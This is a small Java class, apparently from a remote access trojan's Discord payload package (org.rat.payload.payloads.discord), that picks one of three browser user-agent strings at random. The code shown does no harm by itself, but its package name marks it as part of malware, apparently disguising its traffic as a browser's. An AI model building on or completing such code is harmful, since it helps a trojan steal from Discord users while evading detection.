//Raddon On Top!

package org.rat.payload.payloads.discord;

public class UserAgents
{
    final String[] agents;
    
    public UserAgents() {
        this.agents = new String[] { "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.94" };
    }
    
    public String getAgent() {
        return this.agents[(int)(Math.random() * this.agents.length)];
    }
}
